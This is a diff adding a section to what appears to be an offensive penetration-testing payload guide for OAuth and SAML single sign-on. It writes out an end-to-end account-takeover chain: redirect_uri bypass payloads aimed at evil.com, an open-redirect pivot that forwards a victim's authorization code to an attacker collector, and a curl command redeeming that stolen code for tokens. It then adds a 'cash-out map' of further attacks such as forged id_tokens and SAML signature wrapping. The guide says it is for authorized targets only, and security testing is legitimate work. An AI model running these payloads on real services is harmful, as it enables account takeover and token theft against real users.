@@ -5,6 +5,35 @@ Payloads and tool commands for the guide. Authorized targets only. Two **own** t
 
 ---
 
+## 0.0 The whole attack in one sequence (redirect_uri → steal code → ATO, worked end-to-end in Guide §2.1.1)
+*Map the flow → probe redirect_uri → (if strict) pivot to an open redirect ON the allowed origin → steal the victim's code → redeem → ATO. Two own accounts; capture only your OWN code to rehearse, then B's.*
+
+```
+# 1. MAP — pull the authorization request the app builds (client_id, redirect_uri, response_type, state, PKCE?)
+curl -s https://IDP/.well-known/openid-configuration | jq '{authz:.authorization_endpoint,token:.token_endpoint,pkce:.code_challenge_methods_supported}'
+
+# 2. PROBE redirect_uri (try cheap bypasses first)
+redirect_uri=https://app.example.com.evil.com/cb      # suffix not anchored
+redirect_uri=https://app.example.com@evil.com/cb      # userinfo -> host is evil.com
+redirect_uri=https://evil.com/cb                       # (strict? -> go to step 3)
+redirect_uri=https://app.example.com/cb&redirect_uri=https://evil.com/   # param pollution
+
+# 3. STRICT? pivot to an OPEN REDIRECT on the ALLOWED origin (the money variant)
+#    find app.example.com/out?url=  (or /redirect?next=, /link?url=) that 302s off-origin
+redirect_uri=https://app.example.com/oauth/callback?next=https://app.example.com/out?url=https://YOUR-collector
+
+# 4. STEAL — victim clicks your "Sign in" link; code lands on allowed host -> forwards to your collector
+#    (or Referer-leaks via a 3rd-party resource on the callback page before the code is stripped)
+[collector] GET /?code=<VICTIM_CODE>&state=...
+
+# 5. REDEEM (public/PKCE-less client) -> tokens -> log in as victim = ATO. Prove with account B, STOP.
+curl -s https://IDP/token -d grant_type=authorization_code -d code=<VICTIM_CODE> \
+     -d client_id=<CID> -d redirect_uri=https://app.example.com/oauth/callback
+```
+**Cash-out map:** loose `redirect_uri` OR open-redirect-on-allowed-host → **code/token theft → ATO (Critical, §2.1)** · missing/unchecked `state` + account-linking → **silent link-CSRF ATO (Critical, §2.2)** · unverified `email`/`email_verified` ignored → **pre-ATO / SSO-merge ATO (Critical, §2.9)** · `id_token` `alg:none`/`aud`-unpinned/any-email → **forge identity (Critical, §2.7; "Sign in with Apple")** · SAML XSW/sig-strip/comment-inject → **forge assertion → admin (Critical, §3)** · `request_uri`/SAML-parser → **SSRF/XXE (High, §2.8/§3.5)**.
+
+---
+
 ## 0. Recon — pull the whole flow
 
 *What & when:* first thing on any SSO target — grab the IdP's public "menu" (the discovery doc lists every endpoint, whether PKCE is supported, the signing keys) and pull the exact flow out of the app's JS/HTML. You can't attack a flow you haven't mapped; this hands you every parameter to tamper with next.
